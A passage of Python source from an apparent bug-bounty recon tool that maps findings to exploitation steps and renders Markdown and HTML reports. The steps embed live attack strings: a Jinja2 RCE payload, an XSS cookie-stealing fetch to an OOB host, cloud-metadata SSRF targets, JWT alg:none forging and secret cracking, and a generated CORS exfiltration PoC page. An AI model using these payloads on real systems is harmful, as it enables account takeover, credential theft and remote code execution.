                 "Call each endpoint unauthenticated and as a low-priv user; look for data you shouldn't see.",
                 "The reportable bug is the broken endpoint you find, not the spec itself."])
        if path.endswith(".map"):
            return _exp("manual", "Source map → recovers original client source (may reveal endpoints/keys/logic).",
                [f'curl -s "{url}" -o app.js.map && npx shuji app.js.map -o src/   # or source-map-explorer',
                 "Grep recovered source for api keys, internal endpoints, auth logic to attack."])
        return _exp("manual", "Reachable non-public resource — confirm it exposes data/function you shouldn't reach.",
            [f'curl -si "{url}"', "Demonstrate concrete sensitive content before reporting."])

    if cat == "cors":
        high = "acac" in ev or "credentials" in ev
        return _exp("yes" if high else "manual",
            "Cross-origin theft of authenticated data (ATO-adjacent) if credentials are reflected.",
            [f'Confirm: curl -si -H "Origin: https://evil.example.com" "{url}" | grep -i access-control',
             "Open the generated CORS PoC HTML from another origin while logged in — it reads your data cross-site.",
             "Impact proof = screenshot of victim data exfiltrated to attacker origin."], poc="cors")

    if cat == "open-redirect":
        return _exp("manual", "Phishing, and OAuth/SSO token theft when the param is an OAuth redirect_uri.",
            [f'Confirm 3xx to attacker host: curl -si "{url}"',
             "If it is an OAuth redirect_uri: chain to steal the auth code/token (that is the High-impact report).",
             "Otherwise frame it as credential-phishing; standalone open-redirect is often Low."])

    if cat == "ssrf":
        return _exp("manual", "Internal network / cloud-metadata access → credential theft → sometimes RCE.",
            [f'Inject your OOB listener: {url}  (watch interactsh/Collaborator for a hit)',
             "On a hit, target cloud metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
             "Escalate with gopher:// to hit internal services; report the internal resource you actually reached."])

    if cat == "idor":
        return _exp("manual", "Cross-account data access/modification (OWASP API1) — classic High/Critical.",
            [f'As user A, note the object id at {url}.',
             'As user B (different token), request A\'s id: curl -si -H "Authorization: Bearer <TOKEN_B>" "<url>/<A_id>"',
             "Impact proof = user B successfully reads/edits user A's data. Two accounts required."])

    if cat == "ssti":
        return _exp("yes", "Server-side template injection → RCE on most engines.",
            [f'Re-confirm the computed product is reflected (not the literal payload): curl -s "{url}"',
             "Identify the engine: {{7*7}}=49 Jinja2/Twig · ${7*7}=49 Freemarker/Spring · <%= 7*7 %>=49 ERB",
             "Jinja2 RCE: {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
             "Automate with tplmap / SSTImap; put the `id` command output in the report as proof."])

    if cat == "xss":
        stored = "stored" in (f.get("title", "") + ev).lower()
        return _exp("manual",
            "Session/credential theft, actions-as-victim, or ATO when it fires in an authed/admin view.",
            [f'Reflect a unique marker first (no alert): curl -s "{url}" | grep -o "zzmarkerzz"  # prove the sink',
             "Confirm execution in a real browser; context decides the payload "
             "(HTML: <svg onload=...> · attribute: \"><svg/onload=...> · JS string: ';alert(1)//).",
             "Impact PoC (not alert(1)): <img src=x onerror=\"fetch('https://OOB?c='+btoa(document.cookie))\">",
             ("Stored: show it executes for a DIFFERENT user/session than the one who injected it."
              if stored else "If reflected, check it is not Self-XSS — it must fire without the victim pasting anything.")])

    if cat == "graphql":
        return _exp("manual", "Schema disclosure → find unauth mutations / IDOR; batching → brute/rate-limit bypass.",
            ['Dump schema, then enumerate mutations and sensitive queries.',
             "Call them unauthenticated / as low-priv; the reportable bug is the exposed operation, not introspection itself."])

    if cat == "jwt":
        if "none" in ev or "alg:none" in (f.get("title","").lower()):
            return _exp("yes", "Auth bypass / full account takeover via unsigned token.",
                ['Decode the JWT, set header alg to "none", strip the signature, set sub/role to a victim/admin.',
                 "Replay it; if accepted you have ATO. That acceptance is the proof."])
        return _exp("manual", "Potential key confusion / weak-secret signing.",
            ["If HS256: hashcat -m 16500 <jwt> rockyou.txt to crack the secret, then forge.",
             "If RS256: test HS256 key-confusion with the public key as HMAC secret."])

    if cat == "dns-takeover":
        return _exp("yes", "Subdomain takeover → serve attacker content on a trusted subdomain (cookie theft, phishing, OAuth).",
            [f'Claim the dangling service named in the CNAME for {host}.',
             "Host a proof page; screenshot your content served on the victim subdomain."])

    if cat == "s3":
        return _exp("yes", "Public cloud bucket read (and sometimes write) — data disclosure / content injection.",
            [f'aws s3 ls s3://<bucket> --no-sign-request',
             "aws s3 cp s3://<bucket>/<object> . --no-sign-request   # prove read",
             "Test write: aws s3 cp evil.txt s3://<bucket>/ --no-sign-request (only if write is in scope)."])

    if cat == "cache-poison":
        return _exp("manual", "Persistent XSS/redirect served to other users via the shared cache.",
            [f'Confirm your injected Host reflects AND the response is cached (X-Cache/Age).',
             "Prove it poisons a victim: request without your header shows your payload (use a safe marker, not real XSS)."])

    if cat in ("outdated-lib","cve-fingerprint"):
        return _exp("manual", "Known-CVE exposure — impact depends on reachable sink.",
            [f'Confirm the exact version at {url}.',
             "Find the matching public PoC for that CVE and demonstrate it against a reachable path.",
             "Report only with a working PoC — a version banner alone is usually informational."])

    if cat == "headers":
        # Missing headers are NOT a standalone bounty (triagers reject them).
        # Verdict stays "no" so they don't pollute the chase-list — but if frame
        # protection is absent we still hand over a clickjacking PoC + how to check,
        # since that's the one path that could become real with a framable action.
        clickjack = ("x-frame-options" in ev) and ("content-security-policy" in ev)
        if clickjack:
            return _exp("no", "Hardening gap. Clickjacking is only reportable if a SENSITIVE state-changing "
                              "action can be framed — otherwise triagers reject it.",
                ["Open the generated clickjacking PoC HTML; does the page frame?",
                 "Find a sensitive one-click action (delete, transfer, change email) that works framed.",
                 "Only THEN is it reportable — bare 'missing X-Frame-Options' is not."], poc="clickjack")
        csp_absent = "content-security-policy" in ev
        steps = [f'Confirm which headers are absent: curl -sI "{url}"']
        if csp_absent:
            steps.append("No CSP means an injection here isn't mitigated — go HUNT a reflected/stored "
                         "XSS on this host; the XSS is the bug, missing-CSP is just why it works.")
        steps.append("Do not submit the missing header alone — it's rejected as a hardening gap.")
        return _exp("no", "Missing security headers are hardening gaps; not an independently rewardable bug.",
            steps)

    if cat in ("tls","dns-sec","cookies","waf","idn-homoglyph"):
        return _exp("no", "Best-practice / hardening finding — generally out of scope or non-paying on its own.",
            ["Do not submit standalone; mention only as context inside a real vulnerability report."])

    return _exp("manual", "Validate and demonstrate concrete impact before reporting.",
        [f'Reproduce: {f.get("command") or url}'])

def generate_poc_files(findings: list, domain: str, out_dir: Path):
    """Write real PoC artifacts (clickjacking / CORS) the user can open in a browser."""
    poc_dir = out_dir / "poc"
    made = False
    for f in findings:
        exp = f.get("exploit") or {}
        kind = exp.get("poc")
        url = f.get("url") or f"https://{domain}"
        if kind == "clickjack":
            poc_dir.mkdir(parents=True, exist_ok=True); made = True
            p = poc_dir / f"clickjacking_{urlparse(url).netloc or domain}.html"
            p.write_text(f"""<!doctype html><html><head><meta charset="utf-8">
<title>Clickjacking PoC — {url}</title></head><body>
<h3>Clickjacking PoC for {url}</h3>
<p>If the target renders below, it lacks frame protection. Overlay a lure over a
sensitive button to prove UI-redress. Only a report if a sensitive action is framable.</p>
<iframe src="{url}" width="1000" height="700" style="opacity:0.5;border:2px solid red"></iframe>
</body></html>""", encoding="utf-8")
            f["poc_file"] = str(p)
        elif kind == "cors":
            poc_dir.mkdir(parents=True, exist_ok=True); made = True
            p = poc_dir / f"cors_{urlparse(url).netloc or domain}.html"
            p.write_text(f"""<!doctype html><html><head><meta charset="utf-8">
<title>CORS exfil PoC — {url}</title></head><body>
<h3>CORS credentialed-read PoC for {url}</h3>
<pre id="out">running…</pre>
<script>
// Host this on an attacker origin, open it while logged into the target.
fetch("{url}", {{credentials:"include"}})
  .then(r => r.text())
  .then(d => {{ document.getElementById('out').textContent = d.slice(0,2000);
               /* real attacker would POST d to their server */ }})
  .catch(e => document.getElementById('out').textContent = "blocked: " + e);
</script></body></html>""", encoding="utf-8")
            f["poc_file"] = str(p)
    return poc_dir if made else None

def attach_exploitation(result: ScanResult, domain: str, out_dir: Path):
    for f in result.findings:
        f["exploit"] = exploitation_for(f, domain)
        f["framework"] = framework_for(f.get("category") or f.get("type") or "")
    generate_poc_files(result.findings, domain, out_dir)

def generate_markdown(result: ScanResult, out_path: Path):
    sev_counts = {}
    for f in result.findings:
        s = f.get("severity","Info")
        sev_counts[s] = sev_counts.get(s,0) + 1

    lines = [
        f"# Bounty Recon Report — {result.target}",
        f"",
        f"| | |",f"|---|---|",
        f"| **Generated** | {result.timestamp} |",
        f"| **Tool** | bounty_recon.py v{VERSION} |",
        f"| **Vantage** | Open internet, no proxy, read-only |",
        f"","---","",
        "## Executive Summary","",
        "| Severity | Count |","|----------|-------|",
    ]
    for sev in ["Critical","High","Medium","Low","Info"]:
        c = sev_counts.get(sev,0)
        lines.append(f"| {SEV_EMOJI.get(sev,'')} **{sev}** | {c} |")
    lines += [f"| ✅ Passed | {len(result.passed)} |",""]

    if result.waf_detected:
        lines += ["## WAF Detection",""]
        for host, waf in result.waf_detected.items():
            if waf.get("vendor"):
                lines.append(f"- `{host}`: **{waf['vendor']}** (confidence: {waf['confidence']})")
                for tip in waf.get("bypass_tips",[])[:3]:
                    lines.append(f"  - Bypass tip: {tip}")
        lines += [""]

    if result.subdomains:
        lines += ["## Discovered Subdomains",""]
        for s in result.subdomains[:50]: lines.append(f"- `{s}`")
        if len(result.subdomains) > 50: lines.append(f"- *... and {len(result.subdomains)-50} more*")
        lines += [""]

    if result.live_hosts:
        lines += ["## Live Hosts","","| URL | Status | Server |","|-----|--------|--------|"]
        for h in result.live_hosts:
            lines.append(f"| `{h['url']}` | {h['status']} | `{h.get('server','?')}` |")
        lines += [""]

    if result.technologies:
        lines += ["## Technologies Detected",""]
        for host, techs in result.technologies.items():
            lines.append(f"- `{host}`: {', '.join(techs)}")
        lines += [""]

    if result.parameters:
        lines += ["## Mined Parameter Names (from live + Wayback)","",
                  "> Use as custom wordlist for ffuf / param-miner",""]
        lines.append("```")
        lines.extend(result.parameters[:100])
        lines.append("```")
        lines += [""]

    if result.routes:
        lines += ["## Discovered Application Routes",""]
        for r in result.routes[:40]: lines.append(f"- `{r}`")
        lines += [""]

    if result.endpoints:
        lines += ["## Extracted API Endpoints",""]
        for ep in result.endpoints[:50]: lines.append(f"- `{ep}`")
        lines += [""]

    if result.oauth_params:
        lines += ["## OAuth Callbacks & Redirect Targets",""]
        for oa in result.oauth_params[:40]: lines.append(f"- `{oa}`")
        lines += [""]

    if result.ai_triage:
        confirmed = [t for t in result.ai_triage if t.get("decision") == "CONFIRMED"]
        lines += ["## 🤖 AI Triage — Confirmed (submit these)", ""]
        if not confirmed:
            lines += ["_No findings survived AI triage as confirmed._", ""]
        for i, t in enumerate(sorted(confirmed, key=lambda x: -x.get("cvss",0)), 1):
            lines += [
                f"### {i}. {t.get('report_title') or t.get('title','?')}",
                "",
                f"**Final severity:** {t.get('final_severity','?')} | **CVSS:** {t.get('cvss',0):.1f} "
                f"`{t.get('cvss_vector','')}` | **Bounty est:** {t.get('bounty_estimate','?')}  ",
                f"**Target:** `{t.get('url','')}`  ",
                "", t.get("summary",""), "",
                f"**Business impact:** {t.get('business_impact','')}", "",
            ]
            if t.get("repro_steps"):
                lines += ["**Reproduction:**", "```"] + [str(s) for s in t["repro_steps"]] + ["```", ""]
            if t.get("commands"):
                lines += ["**Commands:**", "```bash"] + [str(c) for c in t["commands"][:5]] + ["```", ""]
            if t.get("remediation"):
                lines += [f"**Remediation:** {t['remediation']}", ""]
            lines += ["---", ""]

    if result.ai_plan:
        lines += ["## 🤖 AI Attack Plan", "", result.ai_plan, ""]

    # Report-worthiness triage: what actually has an exploit path vs. pure noise
    if any(f.get("exploit") for f in result.findings):
        worthy = [f for f in result.findings if (f.get("exploit") or {}).get("verdict") in ("yes","manual")]
        noise  = [f for f in result.findings if (f.get("exploit") or {}).get("verdict") == "no"]
        lines += ["## 🎯 Report Triage — chase these (the rest are hardening noise)", "",
                  f"- ✅/🔶 **{len(worthy)}** findings have an exploitation path worth pursuing",
                  f"- ⛔ **{len(noise)}** are hardening/informational — do **not** submit standalone", ""]
        for f in sorted(worthy, key=lambda x: SEV_ORDER.get(x.get("severity","Info"),4)):
            exp = f["exploit"]
            lines.append(f"- {VERDICT_LABEL.get(exp['verdict'],'')} · **[{f.get('severity','')}]** "
                         f"{f.get('title') or f.get('detail','')} — `{f.get('url') or f.get('host','')}`")
        lines += [""]

    lines += ["## Findings",""]
    sorted_f = sorted(result.findings, key=lambda f: SEV_ORDER.get(f.get("severity","Info"),4))
    for i, f in enumerate(sorted_f, 1):
        sev = f.get("severity","Info")
        title = f.get("title") or f.get("detail") or f.get("header","") or "Finding"
        url   = f.get("url") or f.get("host","")
        lines += [f"### {i}. {SEV_EMOJI.get(sev,'')} [{sev}] {title}","",f"**Severity:** {sev}  "]
        if url: lines.append(f"**Target:** `{url}`  ")
        cat = f.get("category","")
        if cat: lines.append(f"**Category:** `{cat}`  ")
        lines.append("**Tool:** `bounty_recon`  ")
        ev = f.get("evidence") or f.get("snippet") or f.get("detail","")
        if ev: lines += ["**Evidence:**","```",ev[:300],"```"]
        if f.get("command"): lines += ["**Reproduce:**","```bash",f["command"],"```"]
        exp = f.get("exploit")
        if exp:
            lines += ["", f"**Report verdict:** {VERDICT_LABEL.get(exp['verdict'],'')}  ",
                      f"**Impact:** {exp['impact']}  ", "**Exploitation / PoC:**"]
            lines += [f"{n}. {s}" for n, s in enumerate(exp["steps"], 1)]
            if f.get("poc_file"):
                lines.append(f"\n> 📎 PoC file generated: `{f['poc_file']}`")
        if f.get("remediation"): lines.append(f"**Remediation:** {f['remediation']}")
        fw = f.get("framework") or {}
        fwp = [v for v in [fw.get("mitre"), fw.get("owasp"), fw.get("wstg")] if v and v != "—"]
        if fwp: lines.append(f"**Framework:** {' · '.join(fwp)}")
        lines += [""]

    lines += ["## Passed Checks","","```"] + result.passed[:80] + ["```","",
              "---",f"*bounty_recon.py v{VERSION} — read-only passive scanner — use on authorised targets only*"]
    out_path.write_text("\n".join(lines), encoding="utf-8")

def generate_json(result: ScanResult, out_path: Path):
    out_path.write_text(json.dumps(asdict(result), indent=2, ensure_ascii=False), encoding="utf-8")

def dedup_findings(findings: list) -> list:
    """Collapse exact-duplicate findings (same severity+category+title+url)."""
    seen, out = set(), []
    for f in findings:
        key = (f.get("severity",""), f.get("category",""),
               f.get("title") or f.get("detail") or f.get("header",""),
               f.get("url") or f.get("host",""))
        if key in seen:
            continue
        seen.add(key)
        out.append(f)
    return out

def generate_html(result: ScanResult, out_path: Path):
    """Self-contained, interactive HTML dashboard (no external assets).

    Severity donut, stat tiles, live filter/search, collapsible finding cards
    with copy buttons, and recon sections (subdomains / hosts / tech / params /
    WAF / AI attack plan). Pure inline CSS + vanilla JS — opens anywhere offline.
    """
    import html as _html
    import json as _json

    C = {"Critical": "#ff4d6d", "High": "#ff8c42", "Medium": "#ffd23f",
         "Low": "#4da6ff", "Info": "#8b95a7"}

    def esc(x):
        return _html.escape(str(x if x is not None else ""))

    sev_counts = {s: 0 for s in ["Critical", "High", "Medium", "Low", "Info"]}
    for f in result.findings:
        s = f.get("severity", "Info")
        sev_counts[s] = sev_counts.get(s, 0) + 1
    total = len(result.findings)
    actionable = sev_counts["Critical"] + sev_counts["High"] + sev_counts["Medium"]

    sorted_f = sorted(result.findings,
                      key=lambda f: SEV_ORDER.get(f.get("severity", "Info"), 4))

    # ── severity donut (inline SVG, conic via stroke-dasharray) ──────────────
    R, CIRC = 54, 2 * 3.14159265 * 54
    donut_segs, offset = [], 0.0
    for s in ["Critical", "High", "Medium", "Low", "Info"]:
        n = sev_counts[s]
        if n == 0 or total == 0:
            continue
        frac = n / total
        seg = frac * CIRC
        donut_segs.append(
            f'<circle r="{R}" cx="80" cy="80" fill="none" stroke="{C[s]}" '
            f'stroke-width="22" stroke-dasharray="{seg:.2f} {CIRC - seg:.2f}" '
            f'stroke-dashoffset="{-offset:.2f}" transform="rotate(-90 80 80)">'
            f'<title>{s}: {n}</title></circle>')
        offset += seg
    donut = (f'<svg viewBox="0 0 160 160" width="160" height="160" class="donut">'
             f'<circle r="{R}" cx="80" cy="80" fill="none" stroke="#242a36" stroke-width="22"/>'
             f'{"".join(donut_segs)}'
             f'<text x="80" y="74" text-anchor="middle" class="donut-num">{total}</text>'
             f'<text x="80" y="94" text-anchor="middle" class="donut-lab">findings</text>'
             f'</svg>')

    legend = "".join(
        f'<button class="leg" data-sev="{s}"><span class="dot" style="background:{C[s]}"></span>'
        f'{s}<b>{sev_counts[s]}</b></button>'
        for s in ["Critical", "High", "Medium", "Low", "Info"])

    # ── stat tiles ───────────────────────────────────────────────────────────
    def tile(num, lab, accent="#6ea8fe"):
        return (f'<div class="tile"><div class="tile-n" style="color:{accent}">{num}</div>'
                f'<div class="tile-l">{esc(lab)}</div></div>')
    tiles = "".join([
        tile(len(result.subdomains), "Subdomains", "#6ea8fe"),
        tile(len(result.live_hosts), "Live hosts", "#4dd4ac"),
        tile(actionable, "Actionable", "#ff8c42"),
        tile(len(result.parameters), "Params mined", "#c792ea"),
        tile(len(result.passed), "Checks passed", "#4dd4ac"),
    ])

    # ── finding cards ─────────────────────────────────────────────────────────
    cards = []
    for i, f in enumerate(sorted_f, 1):
        sev = f.get("severity", "Info")
        title = f.get("title") or f.get("detail") or f.get("header", "") or "Finding"
        url = f.get("url") or f.get("host", "")
        ev = f.get("evidence") or f.get("snippet") or f.get("detail", "")
        cmd = f.get("command", "")
        rem = f.get("remediation", "")
        cat = f.get("category", "") or f.get("type", "")
        exp = f.get("exploit") or {}
        blob = esc(" ".join(str(x) for x in [title, url, ev, cat, sev]).lower())

        exp_html = ""
        if exp:
            steps = "".join(f"<li>{esc(s)}</li>" for s in exp.get("steps", []))
            pocf = (f'<div class="kv">📎 PoC file <code>{esc(f.get("poc_file",""))}</code></div>'
                    if f.get("poc_file") else "")
            exp_html = (
                f'<div class="exp"><span class="verdict">'
                f'{esc(VERDICT_LABEL.get(exp.get("verdict",""),""))}</span> '
                f'{esc(exp.get("impact",""))}'
                f'{f"<ol>{steps}</ol>" if steps else ""}{pocf}</div>')

        fw = f.get("framework") or {}
        fw_tags = "".join(f'<span class="fw">{esc(v)}</span>'
                          for v in [fw.get("mitre"), fw.get("owasp"), fw.get("wstg")]
                          if v and v != "—")
        body = "".join([
            f'<div class="target">{esc(url)}'
            f'<button class="copy" data-copy="{esc(url)}">copy</button></div>' if url else "",
            f'<pre class="ev">{esc(ev[:800])}</pre>' if ev else "",
            (f'<div class="code"><pre>{esc(cmd)}</pre>'
             f'<button class="copy" data-copy="{esc(cmd)}">copy</button></div>') if cmd else "",
            exp_html,
            f'<div class="kv"><b>Fix</b> {esc(rem)}</div>' if rem else "",
            f'<div class="fwrow">{fw_tags}</div>' if fw_tags else "",
        ])

        cards.append(
            f'<details class="card" data-sev="{esc(sev)}" data-blob="{blob}" open>'
            f'<summary><span class="pill" style="background:{C.get(sev,"#888")}">{esc(sev)}</span>'
            f'<span class="ctitle">{esc(title)}</span>'
            f'{f"<span class=cat>{esc(cat)}</span>" if cat else ""}'
            f'<span class="idx">#{i}</span></summary>'
            f'<div class="cbody">{body}</div></details>')

    # ── recon sections (collapsible) ───────────────────────────────────────────
    sections = []

    if result.waf_detected:
        rows = []
        for host, waf in result.waf_detected.items():
            if waf.get("vendor"):
                tips = "".join(f"<li>{esc(t)}</li>" for t in waf.get("bypass_tips", [])[:3])
                rows.append(f'<div class="kv"><code>{esc(host)}</code> → '
                            f'<b>{esc(waf["vendor"])}</b> '
                            f'<span class="muted">(conf {esc(waf.get("confidence",""))})</span>'
                            f'{f"<ul>{tips}</ul>" if tips else ""}</div>')
        if rows:
            sections.append(("🛡️ WAF detection", "".join(rows)))

    if result.live_hosts:
        rows = ['<table><tr><th>URL</th><th>Status</th><th>Server</th></tr>']
        for h in result.live_hosts:
            rows.append(f'<tr><td><a href="{esc(h["url"])}" target="_blank" rel="noopener">'
                        f'{esc(h["url"])}</a></td><td>{esc(h.get("status","?"))}</td>'
                        f'<td><code>{esc(h.get("server","?"))}</code></td></tr>')
        rows.append("</table>")
        sections.append((f"🌐 Live hosts ({len(result.live_hosts)})", "".join(rows)))

    if result.technologies:
        rows = []
        for host, techs in result.technologies.items():
            chips = "".join(f'<span class="tech">{esc(t)}</span>' for t in techs)
            rows.append(f'<div class="kv"><code>{esc(host)}</code> {chips}</div>')
        sections.append(("🧬 Technologies", "".join(rows)))

    if result.subdomains:
        shown = result.subdomains[:300]
        chips = "".join(f'<span class="sub">{esc(s)}</span>' for s in shown)
        extra = (f'<div class="muted">… and {len(result.subdomains)-300} more</div>'
                 if len(result.subdomains) > 300 else "")
        sections.append((f"🔎 Subdomains ({len(result.subdomains)})",
                         f'<div class="subwrap">{chips}</div>{extra}'))

    if result.parameters:
        params = " ".join(result.parameters[:200])
        sections.append((f"🧩 Mined parameters ({len(result.parameters)})",
                         f'<div class="code"><pre>{esc(params)}</pre>'
                         f'<button class="copy" data-copy="{esc(params)}">copy</button></div>'
                         f'<div class="muted">Feed to ffuf / Arjun / param-miner as a wordlist.</div>'))

    if result.ai_plan:
        sections.append(("🤖 AI attack plan",
                         f'<pre class="plan">{esc(result.ai_plan)}</pre>'))

    sections_html = "".join(
        f'<details class="sec"><summary>{t}</summary><div class="secbody">{h}</div></details>'
        for t, h in sections)

    findings_html = ("".join(cards) if cards
                     else '<div class="empty">✅ No findings surfaced in this run.</div>')

    doc = f"""<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Recon · {esc(result.target)}</title>
<style>
*{{box-sizing:border-box}}
:root{{
  --bg:#0b0e14; --bg2:#121722; --card:#151b27; --line:#232c3d; --ink:#e7ecf3;
  --mut:#8b95a7; --accent:#6ea8fe; --mono:ui-monospace,SFMono-Regular,Menlo,monospace;
}}
@media(prefers-color-scheme:light){{:root{{
  --bg:#f4f6fb; --bg2:#fff; --card:#fff; --line:#e3e8f0; --ink:#1b2230; --mut:#5b667a;
}}}}
html{{scroll-behavior:smooth}}
body{{margin:0;font:15px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
  background:var(--bg);color:var(--ink);-webkit-font-smoothing:antialiased}}
a{{color:var(--accent);text-decoration:none}}a:hover{{text-decoration:underline}}
.wrap{{max-width:1120px;margin:0 auto;padding:0 20px}}
header{{background:linear-gradient(135deg,#1a2234,#0b0e14);border-bottom:1px solid var(--line);
  padding:30px 0 26px}}
@media(prefers-color-scheme:light){{header{{background:linear-gradient(135deg,#eaf0fb,#fff)}}}}
.brand{{font-size:12px;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);font-weight:700}}
h1{{margin:6px 0 4px;font-size:27px;letter-spacing:-.02em;word-break:break-all}}
.meta{{color:var(--mut);font-size:13px}}
.hero{{display:flex;gap:28px;align-items:center;flex-wrap:wrap;margin-top:22px}}
.donut-num{{fill:var(--ink);font:700 30px var(--mono)}}
.donut-lab{{fill:var(--mut);font:11px sans-serif;letter-spacing:.08em}}
.legend{{display:flex;flex-direction:column;gap:6px}}
.leg{{display:flex;align-items:center;gap:9px;background:none;border:1px solid transparent;
  color:var(--ink);font:inherit;font-size:13.5px;padding:3px 10px;border-radius:8px;cursor:pointer;
  width:180px;text-align:left;transition:.15s}}
.leg:hover{{background:var(--card)}}
.leg.off{{opacity:.32}}
.leg .dot{{width:11px;height:11px;border-radius:3px;flex:none}}
.leg b{{margin-left:auto;font-variant-numeric:tabular-nums}}
.tiles{{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:12px;flex:1;min-width:280px}}
.tile{{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px 16px}}
.tile-n{{font:700 25px var(--mono)}}
.tile-l{{color:var(--mut);font-size:12.5px;margin-top:2px}}
.toolbar{{position:sticky;top:0;z-index:5;display:flex;gap:10px;flex-wrap:wrap;align-items:center;
  background:var(--bg2);border:1px solid var(--line);border-radius:12px;padding:10px 12px;margin:22px 0 14px}}
.search{{flex:1;min-width:200px;background:var(--bg);border:1px solid var(--line);color:var(--ink);
  border-radius:8px;padding:8px 12px;font:inherit}}
.search:focus{{outline:2px solid var(--accent);outline-offset:-1px}}
.btn{{background:var(--card);border:1px solid var(--line);color:var(--ink);border-radius:8px;
  padding:8px 12px;cursor:pointer;font:inherit;font-size:13px}}
.btn:hover{{border-color:var(--accent)}}
.count{{color:var(--mut);font-size:13px;margin-left:auto}}
.card{{background:var(--card);border:1px solid var(--line);border-left:4px solid #888;
  border-radius:10px;margin:10px 0;overflow:hidden}}
.card[data-sev=Critical]{{border-left-color:{C['Critical']}}}
.card[data-sev=High]{{border-left-color:{C['High']}}}
.card[data-sev=Medium]{{border-left-color:{C['Medium']}}}
.card[data-sev=Low]{{border-left-color:{C['Low']}}}
.card[data-sev=Info]{{border-left-color:{C['Info']}}}
.card.hide{{display:none}}
summary{{list-style:none;cursor:pointer;display:flex;gap:10px;align-items:center;padding:13px 16px;
  user-select:none}}
summary::-webkit-details-marker{{display:none}}
.pill{{color:#0b0e14;border-radius:5px;padding:2px 9px;font-size:11px;font-weight:800;flex:none;
  text-transform:uppercase;letter-spacing:.04em}}
.ctitle{{font-weight:600;font-size:15.5px}}
.cat{{color:var(--mut);font-size:11.5px;border:1px solid var(--line);border-radius:20px;padding:1px 9px}}
.idx{{margin-left:auto;color:var(--mut);font:12px var(--mono)}}
.cbody{{padding:0 16px 16px;border-top:1px solid var(--line)}}
.target{{color:var(--accent);font:13px var(--mono);word-break:break-all;margin:12px 0 4px;
  display:flex;gap:8px;align-items:center}}
pre{{background:var(--bg);border:1px solid var(--line);border-radius:8px;padding:11px 13px;
  overflow:auto;font:12.5px var(--mono);white-space:pre-wrap;word-break:break-word;margin:8px 0}}
.code{{position:relative}}.code pre{{color:#9ae6b4}}
.copy{{background:var(--bg2);border:1px solid var(--line);color:var(--mut);border-radius:6px;
  padding:2px 9px;font-size:11px;cursor:pointer;flex:none}}
.code .copy{{position:absolute;top:14px;right:8px}}
.copy:hover{{color:var(--ink);border-color:var(--accent)}}
.exp{{margin:10px 0;padding:11px 13px;border-left:3px solid {C['Critical']};
  background:rgba(255,77,109,.07);border-radius:8px;font-size:13.5px}}
.verdict{{font-weight:700;color:{C['High']}}}
.exp ol{{margin:7px 0 0;padding-left:20px}}.exp li{{margin:3px 0}}
.kv{{margin:8px 0;font-size:13.5px;color:var(--ink)}}.kv b{{color:var(--mut);margin-right:6px}}
.fwrow{{margin-top:10px;display:flex;gap:6px;flex-wrap:wrap}}
.fw{{font:11px var(--mono);color:var(--mut);background:var(--bg);border:1px solid var(--line);
  border-radius:6px;padding:2px 8px}}
.kv code,.kv ul{{font-size:12.5px}}
.muted{{color:var(--mut);font-size:12.5px;margin-top:6px}}
.empty{{text-align:center;color:var(--mut);padding:50px;background:var(--card);
  border:1px solid var(--line);border-radius:12px}}
h2{{font-size:15px;margin:30px 0 4px;color:var(--mut);letter-spacing:.06em;text-transform:uppercase}}
.sec{{background:var(--card);border:1px solid var(--line);border-radius:10px;margin:10px 0}}
.sec>summary{{font-weight:600}}
.secbody{{padding:4px 16px 16px;border-top:1px solid var(--line)}}
table{{width:100%;border-collapse:collapse;font-size:13px;margin-top:10px}}
th,td{{text-align:left;padding:7px 10px;border-bottom:1px solid var(--line)}}
th{{color:var(--mut);font-weight:600;font-size:12px}}
td code{{font-size:12px}}
.tech,.sub{{display:inline-block;background:var(--bg);border:1px solid var(--line);border-radius:6px;
  padding:2px 8px;margin:3px 4px 0 0;font:12px var(--mono)}}
.sub{{color:var(--mut)}}.subwrap{{margin-top:10px;max-height:340px;overflow:auto}}
.plan{{color:var(--ink);line-height:1.7}}
footer{{color:var(--mut);font-size:12px;padding:30px 0;text-align:center}}
</style></head><body>
<header><div class="wrap">
  <div class="brand">Bug Bounty Recon</div>
  <h1>{esc(result.target)}</h1>
  <div class="meta">Generated {esc(result.timestamp)} · bounty_recon.py v{VERSION} ·
    {total} findings · {len(result.subdomains)} subdomains · {len(result.live_hosts)} live hosts</div>
  <div class="hero">
    {donut}
    <div class="legend">{legend}</div>
    <div class="tiles">{tiles}</div>
  </div>
</div></header>
<div class="wrap">
  <div class="toolbar">
    <input class="search" id="q" placeholder="🔍 Filter findings by text, host, category…" autocomplete="off">
    <button class="btn" id="exp">Expand all</button>
    <button class="btn" id="col">Collapse all</button>
    <span class="count" id="cnt"></span>
  </div>
  <h2>Findings</h2>
  <div id="findings">{findings_html}</div>
  {f'<h2>Recon detail</h2>{sections_html}' if sections_html else ''}
</div>
<footer>Read-only unless run with an active profile · authorised targets only · bounty_recon.py v{VERSION}</footer>
<script>
const off=new Set(),q=document.getElementById('q'),cnt=document.getElementById('cnt');
const cards=[...document.querySelectorAll('.card')];
function apply(){{
  const t=q.value.trim().toLowerCase();let n=0;
  cards.forEach(c=>{{
    const okS=!off.has(c.dataset.sev);
    const okT=!t||(c.dataset.blob||'').includes(t);
    const show=okS&&okT;c.classList.toggle('hide',!show);if(show)n++;
  }});
  cnt.textContent=n+' / '+cards.length+' shown';
}}
document.querySelectorAll('.leg').forEach(b=>b.addEventListener('click',()=>{{
  const s=b.dataset.sev;off.has(s)?off.delete(s):off.add(s);b.classList.toggle('off');apply();
}}));
q.addEventListener('input',apply);
document.getElementById('exp').onclick=()=>cards.forEach(c=>!c.classList.contains('hide')&&(c.open=true));
document.getElementById('col').onclick=()=>cards.forEach(c=>c.open=false);
document.addEventListener('click',e=>{{
  const b=e.target.closest('.copy');if(!b)return;e.preventDefault();
  navigator.clipboard.writeText(b.dataset.copy).then(()=>{{
    const o=b.textContent;b.textContent='✓ copied';setTimeout(()=>b.textContent=o,1200);
  }});
}});
apply();
</script>
</body></html>"""
    out_path.write_text(doc, encoding="utf-8")

def print_finding(f: dict):
    sev = f.get("severity","Info"); em = SEV_EMOJI.get(sev,"⚪")
    t   = f.get("title") or f.get("detail") or f.get("header","")
